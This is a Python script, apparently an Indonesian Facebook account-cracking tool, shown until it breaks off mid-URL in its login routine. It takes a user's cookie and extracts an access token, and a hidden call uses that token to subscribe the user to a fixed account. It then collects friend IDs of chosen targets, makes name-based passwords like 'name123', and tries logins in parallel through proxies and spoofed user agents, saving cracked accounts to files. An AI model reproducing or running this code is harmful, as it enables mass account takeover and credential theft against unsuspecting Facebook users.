	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mIlmanramdhanirahman')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/IlmanRamdhaniR/ILMAN-XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.0.3.2', 
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5', 
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3263) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'Mozilla/5.0 (X11; 10; Linux x86_64)E219Y)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.082.0.4655.104Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]',
'Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 9 Pro Max Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.7-gn',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]',
'Mozilla/5.0 (Linux; Android 12; V2110 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]',
'Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]', 
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B724L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4495.118 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-D636K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4391.69 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4.2-gn',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36', 
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1', 
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1', 
'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1', 
'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3', 
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36'])
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def ilman(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO ]-----------------#
def banner():
	print(f'''\t{asu}
╭──────────────────────────────────────────────╮
│                                              
│
│ 
│ 
│ 
│
│
╰──────────────────────────────────────────────╯
{m}•{k}•{h}•{sir} RECOD : shu-XD {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white] 🍪'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] ├──MASUKKAN COOKIES NJING :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'├── {x}[{h}•{x}]{h} LOGIN BERHASIL NJING JALANKAN ULANG PERINTAHNYA !{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'├── %s[%sx%s]%s LOGIN GAGAL WKWKWK !!!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('╠═[×] COOKIES LU UDAH MODAR WKWKWK ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'IlmanRamdhaniR'
	cetak(nel('\tWELCOME  [yellow]%s[white] '%(my_name)))
	cetak(nel('\tID KAMU : [green] '+str(my_id)))
	print(f'├──[IP KAMU] : {ip}')
	print(f'├──[GITHUB]  : {gh}')
	print('│')
	print('├──[1] MULAI MALING ')
	print('├──[2] HASIL MALING ')
	print('├──[3] KELUAR       ')
	ilmanramdhanirahman = input('\n├──[•] PILIH : ')
	print('│')
	if ilmanramdhanirahman in ['1']:
		dump_massal()
	elif ilmanramdhanirahman in ['2']:
		result()
	elif ilmanramdhanirahman in ['3']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('├──[•] SUKSES KELUAR COOKIES')
		exit()
	else:
		print('├──[•] PILIH YANG BENAR ANJING ')
		back()
def error():
	print(f'{k}├──[•] MAAF FITUR INI MASIH DI PERBAIKI {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'├──[•] 1. HASIL {h}OK{x} ANDA ')
	print(f'├──[•] 2. HASIL {k}CP{x} ANDA ')
	print(f'├──[•] 3. KEMBALI	')
	kz = input(f'\n[•] SELECT : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('├──[FILE TIDAK DITEMUKAN]')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('├──[ANDA TIDAK MEMILIKI HASIL CP] ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'├── %s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
			geeh = input('\n├──[PILIH] : ')
			try:geh = lol[geeh]
			except KeyError:
				print('├──[PILIH YANG BENAR]')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('├──[FILE TIDAK DITEMUKAN]')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('│')
			input(f'{x}[{m}├──[KLIK ENTER]{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('├──[FILE TIDAK DITEMUKAN]')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('├──[ANDA TIDAK MEMPUNYAI FILE OK]')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x}├──[ID] )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}├──[ID] )'%(cih,isi,(len(hem))))
			geeh = input(f'\n├──[PILIH] : ')
			try:geh = lol[geeh]
			except KeyError:
				print('├──[PILIH YANG BENAR KONTOL]')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('├──[FILE TIDAK DITEMUKAN]')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m}├──[KLIK ENTER]{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('├──[PILIH YANG BENAR ANJING]')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('├──[MAU BERAPA TARGET COK] : '))
	except ValueError:
		print('├──[MASUKKAN ANGKA TOLOL BUKAN HURUF] ')
		exit()
	if jum<1 or jum>100:
		print('├──[GAGAL DUMP ID] ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('├──[MASUKKAN ID YANG KE]' +str(yz)+' : ')
		print('├')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('├──[TIDAK ADA SINYAL TOLOL] ')
			exit()
	try:
		print('')
		print(f'├──[TOTAL ID YANG TERKUMPUL] : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├──[TIDAK ADA SINYAL TOLOL] ')
		back()
	except (KeyError,IOError):
		print(f'├──{k} [PERTEMANAN TIDAK PUBLIK] {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}├──[1]-[AKUN JANDA] ')
	print('├──[2]-[AKUN PERAWAN] ')
	print('├')
	hu = input('├──[PILIH] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
#	elif hu in ['3','03']:
#		for bacot in id:
#			xx = random.randint(0,len(id2))
#			id2.insert(xx,bacot)
	else:
		print('├──[PILIH YANG BENER KONTOL]')
		exit()
	print('├──[1]-[MOBILE] ')
	print('├──[2]-[MBASIC] ')
	print('├──[3]-[TOUCH]  ')
	print('├──[4]-[MTOUCH] ')
	print('├')
	hc = input('├──[SELECT] : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('├──[PILIH YANG BENAR KONTOL]')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('├')
	_jembot_ = input('├──[TAMPILKAN APLIKASI] : [Y/T] ')
	if _jembot_ in ['']:
		print('├──[SELECT THATS TRUE]')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('├──[TAMBAHKAN PASSWORD MANUAL] : [Y/T] ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] MASUKKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[green] SAYANG,INDONESIA,GANTENG[white] '))
		pwku=input('├──[PASSWORD TAMBAHAN contoh 123,sayang,anjing] : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('├──SEDANG MULAI COLY MOHON TUNGGU SAMBAI SELESAI')
	print('├')
	print(f'├──[OK]HASIL {h}OK{x} TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'├──[CP]HASIL {k}CP{x} TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	print(f'├──[PLAY AIRPLANE EVERY {m}500{x} ID\n]')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]├──[green] COLY SUCCESFULLY HASIL NIKMATIN AJA[cyan] ├──[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('├──[LANJUT CRACK KEMBALI TOD [Y/T]')
	woi = input('├──[SELECT] : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[{k} ├──[SEE YOU NEXT TIME]{x}]')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r├──{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f